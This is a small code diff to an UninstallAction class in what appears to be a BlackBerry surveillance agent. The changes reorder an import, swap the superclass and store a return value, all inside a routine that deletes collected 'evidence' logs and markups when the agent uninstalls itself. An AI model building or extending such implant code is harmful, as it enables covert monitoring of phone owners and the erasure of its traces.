@@ -11,9 +11,9 @@ package blackberry.action;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
-import blackberry.ModuleManager;
 import blackberry.EventManager;
 import blackberry.Main;
+import blackberry.ModuleManager;
 import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.config.Conf;
@@ -27,7 +27,7 @@ import blackberry.utils.Utils;
 /**
  * The Class UninstallAction.
  */
-public final class UninstallAction extends SubAction {
+public final class UninstallAction extends SubActionMain {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
     //#endif
@@ -155,7 +155,7 @@ public final class UninstallAction extends SubAction {
             //#endif
             EvidenceCollector.getInstance().removeProgressive();
             Markup.removeMarkups();
-            EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
+            int removed=EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
 
             //#ifdef DEBUG
             CodeModuleManager.promptForResetIfRequired();
